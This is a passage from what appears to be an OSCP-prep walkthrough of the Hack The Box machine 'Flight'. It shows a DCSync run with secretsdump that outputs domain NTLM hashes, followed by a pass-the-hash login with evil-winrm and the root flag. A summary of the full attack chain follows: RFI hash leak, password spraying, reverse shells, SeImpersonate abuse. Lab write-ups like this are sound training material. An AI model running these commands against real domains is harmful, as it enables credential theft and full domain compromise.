<h2 id="dcsync">DCSync</h2>
<p>next, i used secretsdump to perform the <code>DCSync</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>g0.flight.htb
</span></code></pre></div>
<ul>
<li><code>k</code> tells it to use <strong>Kerberos authentication</strong> instead of NTLM.</li>
<li><code>no-pass</code> means <strong>you don’t provide a password</strong>.</li>
<li>So effectively, it uses the <strong>Kerberos ticket</strong> to authenticate to the target.</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>Impacket<span class="w"> </span>v0.13.0.dev0+20250130.104306.0f4b866<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>
</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a>
</span><span id="__span-125-3"><a id="__codelineno-125-3" name="__codelineno-125-3" href="#__codelineno-125-3"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Policy<span class="w"> </span>SPN<span class="w"> </span>target<span class="w"> </span>name<span class="w"> </span>validation<span class="w"> </span>might<span class="w"> </span>be<span class="w"> </span>restricting<span class="w"> </span>full<span class="w"> </span>DRSUAPI<span class="w"> </span>dump.<span class="w"> </span>Try<span class="w"> </span>-just-dc-user
</span><span id="__span-125-4"><a id="__codelineno-125-4" name="__codelineno-125-4" href="#__codelineno-125-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span><span id="__span-125-5"><a id="__codelineno-125-5" name="__codelineno-125-5" href="#__codelineno-125-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
</span><span id="__span-125-6"><a id="__codelineno-125-6" name="__codelineno-125-6" href="#__codelineno-125-6"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
</span><span id="__span-125-7"><a id="__codelineno-125-7" name="__codelineno-125-7" href="#__codelineno-125-7"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-125-8"><a id="__codelineno-125-8" name="__codelineno-125-8" href="#__codelineno-125-8"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::
</span><span id="__span-125-9"><a id="__codelineno-125-9" name="__codelineno-125-9" href="#__codelineno-125-9"></a>S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
</span></code></pre></div>
<p>Why did this work?</p>
<ul>
<li>used the machine account’s ticket (TGT/TGS) — not a regular user.</li>
<li>The machine account was able to <strong>authenticate to the target over SMB/RPC</strong>.</li>
<li>Because the target host (DC) trusts machine accounts, it allowed access to <strong>LSASS</strong>, and secretsdump could retrieve NTLM hashes of other users, including <code>Administrator</code>.</li>
</ul>
<p>Key points:</p>
<ul>
<li><strong>Machine account tickets can be more powerful than regular user tickets</strong>, because the account is essentially a trusted domain principal.</li>
<li>Not every machine account can dump secrets everywhere — depends on <strong>domain policies</strong> and <strong>target host</strong>.</li>
<li>The fact that you dumped the Administrator NTLM confirms that:<ol>
<li>The ticket was valid for the target service (TGS for CIFS/host).</li>
<li>The machine account had sufficient privilege to read LSASS.</li>
</ol>
</li>
</ul>
<p>so we got administrators NTLM hash! lets login via winrm</p>
<h2 id="logging-in-as-administrator-via-pass-the-hash">Logging in as Administrator via pass the hash</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>flight.htb<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;43bbfc530bab76141b12c8446e30c17c&#39;</span>
</span></code></pre></div>
<p>grabbed root flag: <code>be6ba64f9dd6f54a69284c332c492694</code></p>
<p>proof:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image23.png" /></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap <code>scan</code> -&gt; chose <code>SMB</code> <code>RPC</code> <code>LDAP</code> and <code>HTTP</code> to focus on first</li>
<li><strong>Enumerated</strong> <code>SMB</code> -&gt; nothing valuable found</li>
<li><strong>Enumerated</strong> <code>RPC</code> -&gt; nothing valuable found</li>
<li><strong>Enumerated</strong> <code>LDAP</code> -&gt; nothing valuable found</li>
<li><strong>Enumerated</strong> <code>HTTP</code>, first <strong>directories</strong>, then <strong>subdomains</strong>, and then <mark>virtual hosts</mark> -&gt; found vhosts</li>
<li><strong>Inspected</strong> the webapp, and <strong>gathered information</strong></li>
<li>According to the information gathered, it was found to be <strong>vulnerable</strong> <code>RFI</code></li>
<li><strong>Exploiting</strong> <code>RFI</code> leaked the NTLM hash of a user (svc_apache)</li>
<li><strong>Cracked</strong> the NTLM hash, got password for user (svc_apache)</li>
<li><strong>Correlated</strong> the found creds with SMB, LDAP, RPC services</li>
<li><strong>Enumerated</strong> <code>SMB</code> as this user (svc_apache), found valid users</li>
<li><strong>Enumerated</strong> <code>LDAP</code> as this user (svc_apache) but nothing interesting was found</li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li><code>Password spraying</code> via <code>SMB</code> was performed, found <strong>valid creds</strong> for another user (S.Moon)</li>
<li><strong>Correlated</strong> the found creds with SMB, LDAP, RPC services</li>
<li><strong>Enumerated</strong> <code>SMB</code> as this user (S.Moon), found <strong>WRITE permissions</strong> to a share</li>
<li>Found <strong>exploit</strong> and by uploading it to the share leaked the <mark>NTLM hash</mark> of another user (C.Bum) </li>
<li><strong>Cracked</strong> the <mark>NTLM hash</mark>, got password for user (C.Bum) </li>
<li><strong>Correlated</strong> the found creds with SMB, LDAP, RPC services</li>
<li><strong>Enumerated</strong> <code>SMB</code> as this user (C.Bum), found <strong>WRITE permissions</strong> to a share, the exact same share that the vhost page's content was stored</li>
<li>Found <strong>exploit</strong> and by <strong>uploading</strong> it to the share, and <strong>triggering</strong> it by navigating it to the webpage, we got <mark>rev shell</mark> as a user (svc_apache)</li>
<li>Impersonated user C.Bum as svc_apache, via running a new process as another user (RunAs, since we know the creds of C.Bum, and created a new cmd process run as C.Bum to send a rev shell back to our machine</li>
<li>Got rev shell back to our machine, as user C.Bum</li>
<li>got <mark>user flag</mark></li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li><strong>Enumerated</strong> files and directories , and found the existence of <mark>IIS server</mark></li>
<li><strong>Uploaded</strong> <mark>winPEAS</mark> to find privesc paths, focused on the <mark>listening ports</mark></li>
<li><strong>Correlated</strong> <mark>listening ports</mark> with the IIS server, found the corresponding <strong>port</strong></li>
<li><strong>Port forwarded</strong> the port to attacker host, then inspected the webpage</li>
<li><strong>Enumerated</strong> the files of the IIS server, and found that user C.Bum has <code>WRITE</code> permissions there</li>
<li><strong>Uploaded</strong> an aspx <mark>rev shell</mark>, and got shell as <mark>iis apppool\defaultapppool</mark></li>
<li><strong>Privileges</strong> of this user revealed the existence of <code>SeImpersonate</code> Privilege, which in this case (iis apppool user) can impersonate the machine account</li>
<li><strong>Grabbed</strong> machine account's <mark>ticket</mark></li>
<li><strong>Used</strong> the <mark>ticket</mark> to authenticate and perform <mark>DCSync</mark>, which reavealed the <code>NTLM</code> hash of <strong>Administrator</strong></li>
<li><strong>Logged</strong> in as <strong>Administrator</strong> via pass the hash and grabbed the <mark>root flag</mark></li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>One of the best, most enjoyable and most important machines i have done so far. This was my first contact with virtual hosts, and also featured a multitude of different methods along with the exploitation of the both webapps. Privesc also almost had everything from port forwarding to user impersonation and DCSync. </p>
<p>What i also will remember from this one, is the enumeration for <code>virtual hosts</code>, and also that one user can <code>impersonate another user via running a new process</code> as the other user, if he knows the creds for the other user. </p>
<p>To sum up, this machine almost had everything, and i will definetely revisit it often throughout my OSCP journey.</p>
<p><img alt="image.png" src="../MediaFiles/flight_image24.png" /></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>